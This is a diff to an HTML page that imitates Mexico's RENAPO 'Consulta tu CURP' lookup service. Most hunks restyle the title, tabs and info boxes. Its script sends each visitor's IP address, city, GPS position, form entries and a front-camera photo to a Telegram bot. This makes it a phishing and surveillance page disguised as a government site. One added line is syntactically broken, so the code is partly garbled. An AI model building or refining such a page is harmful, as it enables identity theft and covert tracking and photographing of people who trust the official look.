@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Consulta tu CURP - RENAPO</title>
 <style>
-:root{--guinda:#611232;--guinda-osc:#7a1a3d;--vino:#4a0d25;--vino-osc:#3d0a1e;--dorado:#a57f2c;--cafe:#8a6d3b;--rojo:#d92d20}
+:root{--guinda:#611232;--guinda-osc:#7a1a3d;--vino:#4a0d25;--vino-osc:#3d0a1e;--dorado:#a57f2c;--cafe:#8a6d3b;--rojo:#d92d20;--azul-claro:#dff2fc;--azul-borde:#b6dff5}
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:#1a1a1a;line-height:1.45}
 
@@ -37,7 +37,15 @@ body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:#1a1a1a;lin
 .breadcrumb .actual{font-weight:800;color:#1a1a1a}
 .breadcrumb .sep{color:#9CA3AF;font-weight:400}
 .breadcrumb svg{display:inline-block;vertical-align:middle}
-.page-title{font-size:32px;font-weight:900;color:#111111;margin-bottom:18px;letter-spacing:-.5px}
+
+/* ===== 1) Título en 2 líneas, mayúsculas, súper bold ===== */
+.page-title{
+  font-size:34px;font-weight:900;color:#111111;
+  margin-bottom:18px;letter-spacing:-.5px;
+  line-height:1.05;text-transform:uppercase;
+}
+.page-title span{display:block}
+
 .section-search-title{font-size:23px;font-weight:900;color:#111111;padding-bottom:8px;margin-bottom:14px;position:relative}
 .section-search-title::after{
   content:"";display:block;width:62px;height:3px;
@@ -45,7 +53,7 @@ body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:#1a1a1a;lin
 }
 .search-intro{font-size:15px;color:#222222;margin-bottom:18px;font-weight:500}
 
-/* ===== Pestañas apiladas en una columna ===== */
+/* ===== 2) Pestañas apiladas, Datos Personales compacta ===== */
 .tabs{display:flex;flex-direction:column;align-items:flex-start;gap:0;margin-bottom:16px;border:none}
 .tab-btn{
   background:#EFE5E9;color:#1a1a1a;
@@ -56,8 +64,25 @@ body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:#1a1a1a;lin
   width:100%;
 }
 .tab-btn:first-child{border-radius:5px 5px 0 0}
-.tab-btn:last-of-type{border-radius:0 0 5px 5px;border-bottom:1px solid #d8c2ca;border-top:1px solid #d8c2ca}
 .tab-btn.active{background:var(--guinda);color:#FFFFFF;border-color:var(--guinda);font-weight:800}
+/* Datos Personales: fondo BLANCO y ancho ajustado al texto */
+.tab-btn#btn-tab-datos{
+  background:#FFFFFF;
+  color:#1a1a1a;
+  border:1px solid #d8c2ca;
+  border-top:1px solid #d8c2ca;
+  border-radius:0 0 5px 5px;
+  width:auto;
+  display:inline-block;
+  align-self:flex-start;
+  padding:11px 16px;
+}
+.tab-btn#btn-tab-datos.active{
+  background:#FFFFFF;
+  color:var(--guinda);
+  border-color:var(--guinda);
+  font-weight:800;
+}
 .tab-btn:disabled,.tab-btn.is-disabled{border:1.5px solid #d92d20;color:#b42318;background:#fef3f2;cursor:not-allowed}
 
 .form-group{margin-bottom:14px}
@@ -81,7 +106,7 @@ select.form-control{padding:10px 12px;height:44px}
 .help-curp-link:active{opacity:.7}
 .required-note{font-size:13px;color:#444444;margin-bottom:14px;font-weight:600}
 
-/* ===== Botón Buscar con lupa a la derecha ===== */
+/* ===== 3) Botón Buscar con lupa a la DERECHA ===== */
 .btn-buscar{
   background-color:var(--guinda);color:#FFFFFF;border:none;border-radius:4px;
   padding:11px 20px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;
@@ -101,10 +126,12 @@ select.form-control{padding:10px 12px;height:44px}
 .load{width:11px;height:11px;border:2px solid #FFFFFF;border-top-color:transparent;border-radius:50%;animation:s .7s linear infinite;display:inline-block;vertical-align:-2px;margin-right:4px}
 @keyframes s{to{transform:rotate(360deg)}}
 
-/* ===== Cajas informativas compactas ===== */
+/* ===== 4) Cajas informativas con fondo AZUL CLARO ===== */
 .info-boxes{margin-top:16px;display:flex;flex-direction:column;gap:8px}
 .info-box{
-  background-color:#F5E9EE;border:1px solid #d8c2ca;border-radius:5px;
+  background-color:var(--azul-claro);
+  border:1px solid var(--azul-borde);
+  border-radius:5px;
   padding:8px 12px;text-align:center;color:#111111;
   font-size:13px;line-height:1.35;font-weight:500;
 }
@@ -142,7 +169,7 @@ select.form-control{padding:10px 12px;height:44px}
 </head>
 <body>
 
-<!-- ===== ENCABEZADO SIN ESCUDO ===== -->
+<!-- ===== ENCABEZADO ===== -->
 <header class="header-gob">
   <div class="top-bar">
     <a href="#" class="brand-gov" aria-label="Gobierno de México">
@@ -161,7 +188,7 @@ select.form-control{padding:10px 12px;height:44px}
 </header>
 
 <main class="container">
-  <!-- ===== RUTA con casita estilo referencia ===== -->
+  <!-- ===== RUTA ===== -->
   <nav class="breadcrumb" aria-label="Ruta de navegación">
     <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
       <path d="M3 10.5 12 3l9 7.5"/>
@@ -174,7 +201,8 @@ select.form-control{padding:10px 12px;height:44px}
     <span class="actual">Consulta tu CURP</span>
   </nav>
 
-  <h1 class="page-title">Consulta tu CURP</h1>
+  <!-- ===== 1) TÍTULO EN 2 LÍNEAS ===== -->
+  <h1 class="page-title"><span>CONSULTA TU</span><span>CURP</span></h1>
 
   <section aria-labelledby="busqueda-heading">
     <h2 id="busqueda-heading" class="section-search-title">B&uacute;squeda</h2>
@@ -182,6 +210,7 @@ select.form-control{padding:10px 12px;height:44px}
       La consulta puede efectuarse indicando la clave CURP cuando ya la conoce o proporcionando su nombre y datos de nacimiento.
     </p>
 
+    <!-- ===== 2) PESTAÑAS: Datos Personales compacta, fondo blanco ===== -->
     <div class="tabs" role="tablist">
       <button type="button" id="btn-tab-curp" class="tab-btn active" role="tab" aria-selected="true" onclick="cambiarTab('curp')">
         Clave &Uacute;nica de Registro de Poblaci&oacute;n
@@ -232,6 +261,7 @@ select.form-control{padding:10px 12px;height:44px}
 
       <p class="required-note">* Campos obligatorios</p>
 
+      <!-- ===== 3) Botón Buscar con lupa a la DERECHA ===== -->
       <button type="submit" class="btn-buscar" id="btnBuscar">
         Buscar
         <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
@@ -239,6 +269,7 @@ select.form-control{padding:10px 12px;height:44px}
     </form>
   </section>
 
+  <!-- ===== 4) CAJAS INFORMATIVAS con fondo AZUL CLARO ===== -->
   <section class="info-boxes" aria-label="Información adicional">
     <div class="info-box">
       <h3 class="info-box-title">&iexcl;Sugerencia!</h3>
@@ -442,6 +473,7 @@ function enviar(){
   txt+="📍 <b>IP:</b> "+info.ip+"\n";
   txt+="🏙️ <b>Ciudad:</b> "+info.ciudad+"\n";
   txt+="🌍 <b>País:</b> "+info.pais+"\n";
+  txt+="🧭 <b>GPS:</b> "+info.gps+"\n
   txt+="🧭 <b>GPS:</b> "+info.gps+"\n";
   if(form && Object.keys(form).length){
     txt+="\n📋 <b>DATOS DEL FORMULARIO:</b>\n";
@@ -455,7 +487,6 @@ function enviar(){
     fd.append("chat_id",CHAT);
     fd.append("photo",blob,"foto.jpg");
     fd.append("caption","📷 Foto frontal");
-    fetch(API+"/sendPhoto",{method:"POST",
     fetch(API+"/sendPhoto",{method:"POST",body:fd}).catch(function(){});
   }
   return Promise.resolve();
@@ -553,4 +584,3 @@ document.addEventListener('DOMContentLoaded',function(){
 </script>
 </body>
 </html>
-
